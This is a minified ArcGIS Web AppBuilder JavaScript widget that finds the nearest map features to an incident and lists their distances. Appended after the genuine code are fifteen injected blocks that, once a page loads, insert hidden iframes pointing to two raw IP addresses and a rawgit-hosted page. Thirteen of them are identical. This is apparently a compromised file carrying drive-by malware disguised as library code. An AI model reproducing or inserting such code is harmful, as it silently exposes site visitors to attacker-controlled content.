// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/_base/Color dojo/_base/array dojo/dom-class dojo/dom-construct dojo/dom-style dojo/on esri/geometry/geometryEngine esri/graphic esri/layers/FeatureLayer esri/symbols/SimpleMarkerSymbol esri/symbols/SimpleLineSymbol esri/symbols/Font esri/symbols/TextSymbol esri/tasks/query".split(" "),function(A,m,v,l,h,n,B,r,w,x,C,y,z,D,E,F){return A("ClosestInfo",null,{constructor:function(a,c,b){this.tab=a;this.container=c;this.parent=b;this.graphicsLayer=this.distance=
this.incident=this.featureLayer=null;this.map=b.map;this.specialFields={}},updateForIncident:function(a,c,b){if(this.featureLayer)this.processIncident(a,c,b);else if(0<this.tab.tabLayers.length){var d=new C(this.tab.tabLayers[0].url);r(d,"load",m.hitch(this,function(){d.capabilities&&-1<d.capabilities.indexOf("Query")?(this.featureLayer=d,this.processIncident(a,c,b)):this._processError()}));r(this.parent.opLayers,"layerInfosFilterChanged",m.hitch(this,this._layerFilterChanged))}},_layerFilterChanged:function(a){if(null!==
this.featureLayer&&null!==this.incident&&null!==this.distance&&null!==this.graphicsLayer){var c=this.tab.tabLayers[0].id;l.forEach(a,m.hitch(this,function(a){c===a.id&&this.processIncident(this.incident,this.distance,this.graphicsLayer)}))}},processIncident:function(a,c,b){this.container.innerHTML="";h.add(this.container,"loading");var d=[];this.incident=a;this.distance=c;c=w.buffer(a.geometry,c,this.parent.config.distanceSettings[this.parent.config.distanceUnits]);this.graphicsLayer=b;this.graphicsLayer.clear();
var f=this.tab.tabLayers[0].id,e="";this.parent.opLayers.traversal(function(a){if(f===a.id&&a.getFilter())return e=a.getFilter(),!0});b=new F;b.returnGeometry=!0;b.geometry=c;b.where=e;b.outFields=this._getFields(this.featureLayer);b.outSpatialReference=this.parent.map.spatialReference;this.featureLayer.queryFeatures(b,m.hitch(this,function(b){var c=this._getFields(this.featureLayer);b=b.features;if(0<b.length){for(var g=0;g<b.length;g++){for(var e=b[g],f={DISTANCE:this._getDistance(a.geometry,e.geometry)},
h=0;h<c.length;h++)f[c[h]]=e.attributes[c[h]];e.attributes=f}b.sort(this._compareDistance);d.push(b[0])}this._processResults(d)}),m.hitch(this,this._processError))},_processError:function(){this.container.innerHTML="";h.remove(this.container,"loading");this.container.innerHTML=this.parent.nls.noFeaturesFound},_processResults:function(a){this.container.innerHTML="";h.remove(this.container,"loading");0===a.length&&(this.container.innerHTML=this.parent.nls.noFeaturesFound);var c=n.create("div",{id:"tpc",
style:"width:"+220*a.length+"px;"},this.container);h.add(c,"IMT_tabPanelContent");for(var b=this.parent.nls[this.parent.config.distanceUnits],d=0;d<a.length;d++){var f=d+1,e=a[d],g=e.geometry,q=g;"point"!==g.type&&(q=g.getExtent().getCenter());var e=e.attributes,p=b+": "+Math.round(100*e.DISTANCE)/100,g="",k=0,l;for(l in e)"DISTANCE"!==l&&3>k&&(g+=this._getFieldValue(l,e[l])+"\x3cbr/\x3e",k+=1);k=n.create("div",{id:"Feature_"+f},c);h.add(k,"IMTcolRec");var t=n.create("div",{},k);h.add(t,"IMTcolRecBar");
var u=n.create("div",{innerHTML:f},t);h.add(u,"IMTcolRecNum");B.set(u,"backgroundColor",this.parent.config.color);r(u,"click",m.hitch(this,this._zoomToLocation,q));p=n.create("div",{innerHTML:p},t);h.add(p,"IMTcolDistance");this.parent.config.enableRouting&&(p=n.create("div",{},t),h.add(p,"IMTcolDir"),r(p,"click",m.hitch(this,this._routeToIncident,q)));g=n.create("div",{innerHTML:g},k);h.add(g,"IMTcolInfo");g=new z(z.STYLE_SOLID,new v.fromString(this.parent.config.color),1);g=new y(y.STYLE_CIRCLE,
24,g,new v.fromString(this.parent.config.color));k=new D;k.family="Arial";k.size="12px";f=new E(f,k,"#ffffff");f.setOffset(0,-4);this.graphicsLayer.add(new x(q,g,e));this.graphicsLayer.add(new x(q,f,e))}},_getFields:function(a){var c=[];if(this.tab.advConfig&&this.tab.advConfig.fields&&0<this.tab.advConfig.fields.length)l.forEach(this.tab.advConfig.fields,function(a){c.push(a.expression)});else{var b;b=a.infoTemplate?a.infoTemplate.info.fieldInfos:a.fields;for(var d=0;d<b.length;d++){var f=b[d];"undefined"!==
typeof f.visible?f.visible&&c.push(f.fieldName):c.push(f.name)}}var e={};l.forEach(a.fields,function(a){if("esriFieldTypeDate"===a.type||a.domain)e[a.name]=a});this.specialFields=e;return c},_getFieldValue:function(a,c){var b=c;this.specialFields[a]&&(a=this.specialFields[a],"esriFieldTypeDate"===a.type?b=(new Date(c)).toLocaleString():l.some(a.domain.codedValues,function(a){if(a.code===c)return b=a.name,!0}));return b},_getDistance:function(a,c){var b=0,d=this.parent.config.distanceUnits,b=w.distance(a,
c,9001);switch(d){case "miles":b*=6.21371E-4;break;case "kilometers":b*=.001;break;case "feet":b*=3.28084;break;case "yards":b*=1.09361;break;case "nauticalMiles":b*=5.39957E-4}return b},_compareDistance:function(a,c){return a.attributes.DISTANCE<c.attributes.DISTANCE?-1:a.attributes.DISTANCE>c.attributes.DISTANCE?1:0},_zoomToLocation:function(a){this.parent.zoomToLocation(a)},_routeToIncident:function(a){this.parent.routeToIncident(a)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});